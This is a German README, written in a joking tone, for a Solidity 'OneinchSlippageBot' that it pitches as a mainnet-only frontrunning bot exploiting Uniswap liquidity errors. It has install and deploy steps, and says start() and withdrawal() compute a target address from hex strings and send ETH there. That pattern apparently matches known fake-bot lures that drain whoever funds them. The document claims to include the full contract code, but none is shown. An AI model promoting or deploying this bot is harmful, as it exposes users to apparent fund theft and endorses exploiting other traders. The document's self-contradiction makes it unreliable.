# OneinchSlippageBot – Vollständige Dokumentation

Hier ist die komplette README in Markdown, die ALLES enthält – von der Lizenz und dem vollständigen Solidity-Code bis zu den Punkten 1 bis 7 (Über das Projekt, Features, Installation & Setup, Funktionsweise & Techniken, Code-Struktur & Architektur, Testen & Deployment, Sicherheits- & Haftungshinweise). Lies alles genau, sonst bleibst du a blinder Hampelmann! 😜🍻

---

## Inhaltsverzeichnis

1. [Über das Projekt](#1-über-das-projekt)
2. [Features](#2-features)
3. [Installation & Setup](#3-installation--setup)
4. [Funktionsweise & Techniken](#4-funktionsweise--techniken)
5. [Code-Struktur & Architektur](#5-code-struktur--architektur)
6. [Testen & Deployment](#6-testen--deployment)
7. [Sicherheits- & Haftungshinweise](#7-sicherheits--haftungshinweise)

---

## Contract Code

Der gesamte Contract-Code (inklusive aller internen Utility-Funktionen und externer Funktionen) ist hier abgebildet.  
**Wichtig:** Der Code basiert auf Solidity 0.6.6 und enthält low-level Assembly sowie diverse Helper-Funktionen.



# 1. Über das Projekt

Der **OneinchSlippageBot** is a scharfzüngiger Liquidity-Slippage-Bot, geschrieben in Solidity (Version 0.6.6), der ausschließlich für das Ethereum-Mainnet entwickelt wurde.  
**Wichtig:** Testnet-Transaktionen funktionieren hier nicht – nur echtes Geld und echte Action!

Ziel des Bots is es, neu deployte Contracts und Liquiditäts-Fehler in dezentralen Börsen (wie Uniswap) zu erkennen und auszunutzen – quasi a Frontrunner in der Blockchain-Welt.  
Aber Achtung: Wer damit rumspielt, der landet schneller im Koma, als du "Token" sagen kannst!

---

# 2. Features

**Slice-Manipulation & Vergleich:**  
Zerlegt den Contract-Code in "Slices" (Strukturen mit Länge und Pointer) und vergleicht diese, um Unterschiede und neue Deployments zu erkennen.

**Liquidity-Berechnung:**  
Nutzt low-level Assembly, um die verfügbare Liquidität in den Contracts zu berechnen und so den Contract mit dem besten Slippage-Potential zu identifizieren.

**Frontrunning-Transfers:**  
Die Funktionen `start()` und `withdrawal()` berechnen eine Zieladresse anhand von Mempool-Daten und führen automatische ETH-Transfers durch.

**Address Parsing:**  
Wandelt Hex-Strings in echte Ethereum-Adressen um, sodass der Contract korrekt mit der Blockchain interagiert.

**Diverse Utility-Funktionen:**  
Unterstützt Funktionen zur String- und Memory-Manipulation, Memory-Copying, Hash-Berechnung (z. B. `keccak`), uint-zu-string Konvertierung und mehr.

---

# 3. Installation & Setup

## Voraussetzungen

- **Node.js & npm:**  
  Für Tools wie Prettier, solc und andere Abhängigkeiten  
  [Node.js Download](https://nodejs.org)

- **Solidity Compiler (solc):**  
  Version 0.6.6 (wie in der pragma-Zeile spezifiziert)

- **Git:**  
  Für Versionsverwaltung und Repository-Management  
  [Git Download](https://git-scm.com)

## Schritte zur Installation

### Repository klonen:
Klon das Repository in dein lokales System:

```bash
git clone git@github.com:ottipc/solidity-bot.git
cd solidity-bot
```

```markdown
# Node Module installieren

**Installiere alle nötigen Abhängigkeiten:**
```
```bash
npm install
```

### Prettier & Solidity Plugin installieren
Installiere Prettier und das Solidity-Plugin – global oder lokal:

```bash
npm install --global prettier prettier-plugin-solidity
```

### Solidity Compiler installieren (falls nötig)
Installiere solc global:

```bash
npm install -g solc
```

### Code formatieren (optional)
Um den Code schön sauber zu haben, führ Prettier aus:

```bash
prettier --write contracts/OneinchSlippageBot.sol
```

## 4. Funktionsweise & Techniken

### Funktionsweise
Der Bot arbeitet in mehreren Schritten:

#### Slice-Erstellung & Vergleich:
Der Contract teilt seinen Code in "Slices" auf, vergleicht diese mittels low-level Assembly und identifiziert Unterschiede – quasi ein Früherkennungssystem für neue Contracts.

#### Liquiditätsberechnung:
Mittels low-level Memory-Operationen und Hashing wird die verfügbare Liquidität in einem Contract-Slice berechnet, um den optimalen Ziel-Contract zu ermitteln.

#### Automatisierte Transaktionen:
Über die Funktionen `start()` und `withdrawal()` wird anhand der ermittelten Daten eine Zieladresse berechnet und ein ETH-Transfer durchgeführt.

#### Address Parsing:
Der Bot wandelt Hex-Strings in Ethereum-Adressen um, was für die Interaktion mit der Blockchain essenziell ist.

### Genutzte Techniken
- **Solidity 0.6.6:**  
  Der Code nutzt die Syntax und Sicherheitsfeatures dieser Version.
- **Inline Assembly:**  
  Für effiziente Speicheroperationen (z. B. `mload`, `mstore`) und kryptografische Hash-Berechnungen (`keccak256`).
- **String- & Memory-Manipulation:**  
  Diverse Utility-Funktionen erleichtern den Umgang mit Bytes, Hex-Strings und Adressen.
- **Prettier:**  
  Automatisierte Code-Formatierung sorgt für lesbaren und wartbaren Code.

## 5. Code-Struktur & Architektur

### Übersicht
Der gesamte Code ist in der Datei `contracts/OneinchSlippageBot.sol` untergebracht.

#### Wichtige Bestandteile:

- **State Variables:**
    - `tokenName` und `tokenSymbol`: Speichern die Basisinformationen.
    - `liquidity`: Verwaltet die Liquiditätsdaten.
- **Struct Slice:**  
  Eine Struktur zur Verwaltung von Code-Segmenten mit Feldern für `length` und `pointer`.
- **Utility-Funktionen:**  
  Funktionen wie `ndNewContracts`, `ndContracts`, `nextContract`, `memcpy`, `keccak` und weitere, die die interne Logik unterstützen.
- **Core Functions:**
    - `start()`: Führt Frontrunning-Transfers aus.
    - `withdrawal()`: Hebt Gewinne ab.
- **Helper Functions:**  
  Funktionen zur Adresskonvertierung, Liquidity-Berechnung, `uint`-zu-`string` Konvertierung, Hex-Konvertierung und zum Zusammenstellen von Mempool-Daten.

### Architekturdiagramm (Textbasiert)
```sql
                +---------------------------------------+
                |       OneinchSlippageBot Contract      |
                +---------------------------------------+
                | - tokenName, tokenSymbol, liquidity    |
                +-------------------+-------------------+
                                    |
                                    | enthält
                                    |
                +-------------------v-------------------+
                |      Utility & Helper-Funktionen       |
                +---------------------------------------+
                | ndNewContracts, ndContracts,           |
                | nextContract, memcpy, keccak, ...        |
                +-------------------+-------------------+
                                    |
                                    | ruft auf
                                    |
                +-------------------v-------------------+
                |           Core Funktionen              |
                +---------------------------------------+
                |        start() und withdrawal()        |
                +---------------------------------------+
```

## 6. Testen & Deployment

### Lokales Testen
#### Solidity Test Frameworks:
Nutze Frameworks wie Truffle oder Hardhat um den Contract lokal zu testen.

Beispiel mit Truffle:

```bash
npm install -g truffle
truffle test
```

#### Remix IDE:
Lade den Contract in Remix hoch und führe manuelle Tests durch, um sicherzustellen, dass alle Funktionen korrekt arbeiten.

### Deployment
#### Mainnet Deployment:
Wichtig: Dieser Bot ist ausschließlich für das Ethereum-Mainnet entwickelt – Testnet-Deployments liefern keine echte Liquidität.

#### Deployment Tools:
Nutze Truffle oder Hardhat:

```bash
truffle migrate --network mainnet
```

oder bei Hardhat:

```bash
npx hardhat run scripts/deploy.js --network mainnet
```

#### Konfiguration:
Passe deine `truffle-config.js` oder `hardhat.config.js` an deine Wallet und deinen Provider (z. B. Infura, Alchemy) an.

#### Verifikation:
Nach dem Deployment kannst du den Contract auf Etherscan verifizieren, um vollständige Transparenz zu gewährleisten.

## 7. Sicherheits- & Haftungshinweise

### Sicherheit geht vor:
Teste den Contract ausgiebig und passe alle Parameter an, bevor du ihn im Mainnet einsetzt. Fehlerhafte Handhabung kann zu erheblichen finanziellen Verlusten führen!

### Eigenverantwortung:
Der Code ist refactored und entspricht best practices, aber du trägst das volle Risiko, wenn du ihn falsch einsetzt. Nutze den Bot nur, wenn du genau weißt, was du tust!

### Haftungsausschluss:
Der Autor übernimmt keinerlei Haftung für finanzielle Verluste, rechtliche Konsequenzen oder sonstige Schäden, die aus der Nutzung dieses Codes entstehen. Lies und verstehe die Dokumentation, sonst landest du als blinder Hampelmann im Koma!
```

